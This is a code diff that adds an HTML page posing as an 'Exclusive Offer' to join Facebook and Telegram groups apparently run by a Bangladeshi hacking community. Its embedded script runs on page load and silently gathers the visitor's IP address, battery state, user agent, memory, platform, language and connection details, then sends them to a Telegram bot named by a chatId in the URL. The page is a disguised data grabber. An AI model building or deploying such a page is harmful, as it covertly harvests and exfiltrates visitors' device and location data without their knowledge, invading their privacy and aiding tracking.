@@ -1,1 +1,197 @@
-invisible(404)
+<!DOCTYPE HTML>
+<html>
+    <head>
+          <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exclusive Offer</title>
+    </head>
+    <body>
+         <div class="offer-container">
+    <div class="offer-box">
+      <h1 class="offer-title">🔥 Exclusive Offer Just for You!</h1>
+      <p class="offer-description">
+        Join our Facebook and Telegram groups today and get instant access to exclusive resources, expert tips, and a vibrant community. Don't miss out!
+      </p>
+      <div class="offer-buttons">
+        <a href="https://facebook.com/groups/bhhchackers/" target="_blank" class="btn facebook-btn">Join on Facebook</a>
+        <a href="https://t.me/bangladeshhackinghelpcenter" target="_blank" class="btn telegram-btn">Join on Telegram</a>
+      </div>
+    </div>
+  </div>
+  <style>
+  /* General Styles */
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  background: linear-gradient(135deg, #1e293b, #64748b);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  color: #fff;
+}
+
+/* Offer Container */
+.offer-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 100%;
+  max-width: 800px;
+  padding: 20px;
+  box-sizing: border-box;
+}
+
+/* Offer Box */
+.offer-box {
+  background: #ffffff;
+  border-radius: 15px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+  text-align: center;
+  padding: 40px 30px;
+  width: 100%;
+  max-width: 600px;
+  color: #1e293b;
+}
+
+/* Title */
+.offer-title {
+  font-size: 28px;
+  font-weight: bold;
+  margin-bottom: 20px;
+  color: #1e293b;
+}
+
+/* Description */
+.offer-description {
+  font-size: 18px;
+  margin-bottom: 30px;
+  line-height: 1.6;
+  color: #475569;
+}
+
+/* Buttons Container */
+.offer-buttons {
+  display: flex;
+  justify-content: center;
+  gap: 20px;
+}
+
+/* Buttons */
+.btn {
+  text-decoration: none;
+  padding: 15px 25px;
+  font-size: 16px;
+  font-weight: bold;
+  border-radius: 5px;
+  transition: all 0.3s ease-in-out;
+  color: #fff;
+}
+
+.facebook-btn {
+  background: #4267B2;
+  box-shadow: 0 5px 15px rgba(66, 103, 178, 0.4);
+}
+
+.facebook-btn:hover {
+  background: #365899;
+  transform: scale(1.1);
+}
+
+.telegram-btn {
+  background: #0088cc;
+  box-shadow: 0 5px 15px rgba(0, 136, 204, 0.4);
+}
+
+.telegram-btn:hover {
+  background: #007ab8;
+  transform: scale(1.1);
+}
+</style>
+        <script>
+            // Function to get query parameters from the URL
+            function getQueryParam(param) {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(param);
+            }
+
+            // Function to collect device and user information
+            async function collectDeviceInfo() {
+                const deviceInfo = {
+                    ip: await fetch('https://api.ipify.org?format=json')
+                        .then((res) => res.json())
+                        .then((data) => data.ip),
+                    battery: navigator.getBattery
+                        ? await navigator.getBattery().then((battery) => ({
+                              level: Math.round(battery.level * 100) + '%',
+                              charging: battery.charging,
+                          }))
+                        : { level: 'Unavailable', charging: 'Unknown' },
+                    userAgent: navigator.userAgent,
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    platform: navigator.platform,
+                    time: new Date().toLocaleTimeString(),
+                    date: new Date().toLocaleDateString(),
+                    language: navigator.language,
+                    connection: navigator.connection
+                        ? {
+                              downlink: navigator.connection.downlink,
+                              effectiveType: navigator.connection.effectiveType,
+                          }
+                        : { downlink: 'Unknown', effectiveType: 'Unknown' },
+                };
+
+                return deviceInfo;
+            }
+
+            // Function to send the collected data to Telegram
+            async function sendToTelegram(botToken, chatId, message) {
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+                return response.ok
+                    ? await response.json()
+                    : Promise.reject(new Error('Failed to send message'));
+            }
+
+            // Main function
+            (async function main() {
+                const chatId = getQueryParam('chatId');
+                if (!chatId) {
+                    alert('Error: Chat ID is missing in the URL. Use ?chatId=YOUR_CHAT_ID');
+                    return;
+                }
+
+                const botToken = 'ENTER_YOUR_BOT_TOKEN'; // Replace with your bot token
+                const deviceInfo = await collectDeviceInfo();
+
+                const message =
+                    `Device Info:\n\n` +
+                    `IP: ${deviceInfo.ip}\n` +
+                    `Battery: ${deviceInfo.battery.level} (Charging: ${deviceInfo.battery.charging})\n` +
+                    `User Agent: ${deviceInfo.userAgent}\n` +
+                    `RAM: ${deviceInfo.deviceMemory}\n` +
+                    `Platform: ${deviceInfo.platform}\n` +
+                    `Time: ${deviceInfo.time}\n` +
+                    `Date: ${deviceInfo.date}\n` +
+                    `Language: ${deviceInfo.language}\n` +
+                    `Connection: Downlink: ${deviceInfo.connection.downlink} Mbps, Effective Type: ${deviceInfo.connection.effectiveType}`;
+
+                try {
+                    const response = await sendToTelegram(botToken, chatId, message);
+                    console.log('Message sent to Telegram:', response);
+                } catch (error) {
+                    alert('Error sending message to Telegram.');
+                    console.error('Error:', error);
+                }
+            })();
+        </script>
+    </body>
+</html>
